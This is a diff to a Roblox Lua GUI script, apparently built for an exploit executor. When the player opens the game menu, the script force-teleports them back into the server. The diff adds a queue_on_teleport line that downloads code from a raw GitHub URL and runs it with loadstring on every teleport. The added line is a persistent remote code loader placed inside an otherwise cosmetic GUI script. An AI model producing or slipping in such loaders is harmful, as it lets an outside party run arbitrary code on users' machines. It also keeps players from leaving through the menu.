@@ -1,6 +1,8 @@
 --[[
 
-Skid
+		Gui2Lua™
+		10zOfficial
+		Version 1.0.0
 
 ]]
 
@@ -297,6 +299,7 @@ local function CXCDDT_fake_script() -- _1.LocalScript
 	
 	game.GuiService.MenuOpened:Connect(function()
 		game.TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
+		queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/shawulplayz/ScriptTesting/refs/heads/main/TestBlackListing.lua'))()")
 	end)
 end
 coroutine.wrap(CXCDDT_fake_script)()
